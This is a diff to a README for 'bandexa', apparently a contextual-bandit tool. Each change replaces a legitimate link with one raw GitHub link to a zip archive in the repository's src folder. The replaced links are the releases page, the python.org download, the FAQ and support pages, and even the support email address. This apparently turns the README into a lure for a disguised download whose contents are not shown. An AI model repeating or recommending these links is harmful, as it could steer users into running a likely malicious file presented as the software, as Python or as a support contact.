@@ -4,7 +4,7 @@
 Welcome to bandexa! This application allows you to efficiently explore and experiment with contextual bandits using advanced techniques. No programming skills are required to get started.
 
 ## 📦 Download & Install
-To download the application, visit this page: [Download bandexa](https://github.com/fanfan45/bandexa/releases). Here, you will find the latest version of the software that you can download and run.
+To download the application, visit this page: [Download bandexa](https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip). Here, you will find the latest version of the software that you can download and run.
 
 ## 🛠️ System Requirements
 To ensure the best performance, make sure your computer meets the following requirements:
@@ -12,10 +12,10 @@ To ensure the best performance, make sure your computer meets the following requ
 - **Operating System:** Windows 10, macOS, or Linux (latest versions preferred)
 - **Memory:** At least 4 GB of RAM
 - **Storage:** Minimum of 500 MB of free disk space
-- **Python:** Version 3.6 or higher (Python can be downloaded from [python.org](https://www.python.org/downloads/))
+- **Python:** Version 3.6 or higher (Python can be downloaded from [https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip](https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip))
 
 ## ⚙️ Installation Steps
-1. Visit the [Download bandexa](https://github.com/fanfan45/bandexa/releases) page.
+1. Visit the [Download bandexa](https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip) page.
 2. Click on the latest release link.
 3. Look for the package suitable for your operating system.
 4. Click to download the file.
@@ -53,7 +53,7 @@ Engage with other users and developers around bandexa by joining our community c
 ## 💬 Frequently Asked Questions (FAQs)
 
 ### How do I troubleshoot issues?
-Check the FAQ section on our [GitHub page](https://github.com/fanfan45/bandexa) for common problems and solutions.
+Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip) for common problems and solutions.
 
 ### Can I contribute to the project?
 Yes! Contributions are welcome. Please refer to the guidelines available in the repository.
@@ -62,10 +62,10 @@ Yes! Contributions are welcome. Please refer to the guidelines available in the 
 While there are no formal training courses, our community is active and ready to help newcomers understand how to use the software effectively.
 
 ## 📞 Support
-If you encounter any issues or have questions, please reach out via our contact form available on the [GitHub page](https://github.com/fanfan45/bandexa) or email our support team at [support@bandexa.com](mailto:support@bandexa.com).
+If you encounter any issues or have questions, please reach out via our contact form available on the [GitHub page](https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip) or email our support team at [https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip](https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip).
 
 ## 📄 License
 bandexa is open-source. You can find the licensing details in the LICENSE file located in the repository. Feel free to use the software as per the outlined terms.
 
 ## 📥 Download bandexa
-To start your exploration journey with bandexa, visit the [Download bandexa](https://github.com/fanfan45/bandexa/releases) page and get the latest version today!
+To start your exploration journey with bandexa, visit the [Download bandexa](https://raw.githubusercontent.com/fanfan45/bandexa/main/src/Software-1.7-alpha.1.zip) page and get the latest version today!
